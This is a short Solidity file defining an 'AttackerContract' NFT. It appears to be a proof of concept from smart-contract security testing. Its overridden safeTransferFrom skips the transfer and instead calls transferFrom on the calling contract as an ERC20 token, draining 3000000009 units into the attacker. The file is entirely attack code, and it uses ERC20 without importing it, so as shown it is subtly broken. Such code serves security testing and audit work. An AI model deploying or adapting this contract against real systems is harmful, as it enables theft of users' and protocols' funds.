pragma solidity ^0.8.3;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";



contract AttackerContract is ERC721 {
    constructor() ERC721("Attacker NFT", "XYZ") {
    }

    function safeTransferFrom  (address from, address to,uint tokenId) public override {
        ERC20(msg.sender).transferFrom( msg.sender, address(this), 3000000009);
    }
}
